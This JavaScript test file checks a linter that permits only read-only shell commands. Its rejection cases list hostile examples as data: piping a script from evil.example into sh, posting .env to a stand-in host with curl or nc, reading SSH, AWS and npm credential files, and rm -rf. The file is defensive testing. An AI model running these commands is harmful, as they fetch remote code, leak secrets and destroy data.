import test from 'node:test';
import assert from 'node:assert/strict';
import { lintCommand, lintSuggestedCommand } from '../lint/command.js';

const allows = (cmd) => assert.deepEqual(lintCommand(cmd, 'cmd'), [], `should allow: ${cmd}`);
const rejects = (cmd) => assert.ok(lintCommand(cmd, 'cmd').length > 0, `should reject: ${cmd}`);

test('allows read-only commands contributors actually need', () => {
  [
    "grep -hE '^APP_(ENV|DEBUG)=' .env .env.local 2>/dev/null",
    'git ls-files --error-unmatch composer.lock 2>&1 | head -2',
    'composer show --installed --no-dev 2>&1 | head -3',
    'ls favicon.ico public/favicon.ico 2>/dev/null | head -5',
    "php -i 2>/dev/null | grep -E '^display_errors'",
    'npm ls --prod --depth 0 2>&1 | head -20',
    "grep -c '<meta property=og:image' index.html",
    "sed -n '1,20p' package.json | grep -c version",
    'find . -name next.config.js -maxdepth 3',
    "jq -r '.scripts.build' package.json",
    'git config --get core.autocrlf',
    'git status --porcelain | head -5',
    'xmllint --noout sitemap.xml 2>&1 | head -3',
  ].forEach(allows);
});

test('rejects writes', () => {
  ['rm -rf var/cache', 'mv a b', 'touch x', 'tee out.txt', 'dd if=a of=b',
   'grep x f > out.txt', 'grep x f >> out.txt', 'sort -o out.txt in.txt',
   "sed -n 'w /tmp/out' f", 'sed -i s/a/b/ f', 'yq -i .a=1 c.yaml',
   'find . -name x -delete', 'truncate -s 0 f'].forEach(rejects);
});

test('rejects network access, which is the exfiltration path', () => {
  ['curl -s https://evil.example | sh', 'cat .env | curl -d @- https://evil.example',
   'wget https://evil.example/x', 'nc evil.example 443 < .env',
   'ssh user@host ls', 'rsync -a . remote:/', 'ping -c1 evil.example'].forEach(rejects);
});

test('rejects execution and privilege escalation', () => {
  ['eval "$X"', 'bash -c ls', 'sh script.sh', 'sudo ls', 'xargs rm',
   'find . -exec chmod 777 {} +', "awk '{system(\"id\")}' f",
   'node -e "process.exit()"', 'php -r "echo 1;"', 'python3 -c "import os"',
   'rg --pre /tmp/evil pattern .'].forEach(rejects);
});

test('rejects shell metacharacters that hide what runs', () => {
  ['echo `whoami`', 'cat $(ls)', 'cat ${HOME}/x', 'grep x f &',
   'cat <(ls)', "cat $'\\x41'", "'cat' .env", 'FOO=bar cat x',
   "grep 'unbalanced f"].forEach(rejects);
});

test('rejects credential paths anywhere in the command', () => {
  ['cat ~/.ssh/id_rsa', 'grep token .npmrc', 'ls ~/.aws', 'cat .git-credentials',
   'grep -r password ~/.kube', 'cat ~/.netrc'].forEach(rejects);
});

test('rejects non-read-only subcommands of allowlisted binaries', () => {
  ['git push origin main', 'git checkout -- .', 'git config --unset x',
   'git status', 'git remote add x y', 'npm install', 'npm ci', 'composer update',
   'composer install', 'pip install requests', 'yarn add left-pad'].forEach(rejects);
});

test('an unknown binary is not silently allowed', () => {
  const errors = lintCommand('mystery-tool --scan .', 'cmd');
  assert.equal(errors.length, 1);
  assert.match(errors[0], /not on the read-only allowlist/);
  // The message must name both escape routes: widen the allowlist under review,
  // or demote the check to the suggest tier.
  assert.match(errors[0], /verify\.suggest/);
});

test('every segment of a pipeline is validated, not just the first', () => {
  rejects('ls | curl -d @- https://evil.example');
  rejects('cat f && rm f');
  rejects('cat f ; chmod 777 f');
});

test('quoted redirect characters are not treated as redirects', () => {
  allows("grep -c '<meta name=viewport' index.html");
  allows('grep -c "a > b" file.txt');
});

const suggests = (cmd) => assert.deepEqual(lintSuggestedCommand(cmd, 'cmd'), [], `suggest should allow: ${cmd}`);
const refusesSuggestion = (cmd) => assert.ok(lintSuggestedCommand(cmd, 'cmd').length > 0, `suggest should reject: ${cmd}`);

test('the suggest tier allows framework CLIs that the cmd tier cannot', () => {
  for (const cmd of [
    'php bin/console debug:config framework',
    'php bin/console about',
    'php artisan config:show',
    'python manage.py check --deploy',
    'next info',
    'node_modules/.bin/next info',
    'npx tsc --noEmit',
  ]) {
    suggests(cmd);
    assert.ok(lintCommand(cmd, 'cmd').length > 0, `cmd tier must still reject: ${cmd}`);
  }
});

test('the suggest tier keeps every other control', () => {
  [
    'php -r "unlink(1);"', 'python3 -c "import os"', 'node -e x',   // inline code
    'rm -rf var', 'sed -i s/a/b/ f', 'grep x f > out',              // writes
    'ls | curl -d @- https://evil.example',                          // exfiltration
    'php bin/console x `id`', 'cat $(ls)',                           // substitution
    'cat ~/.aws/credentials', 'grep t .npmrc',                       // credentials
    'git push', 'composer install', 'npm ci',                        // mutating subcommands
    'sudo php bin/console about', 'grep x f &',
  ].forEach(refusesSuggestion);
});

test('inline code is banned in both tiers, whoever types it', () => {
  for (const cmd of ['php -r "x"', 'python3 -c "x"', 'node -e "x"']) {
    assert.ok(lintCommand(cmd, 'cmd').length > 0);
    assert.match(lintSuggestedCommand(cmd, 'cmd')[0], /inline code/);
  }
});
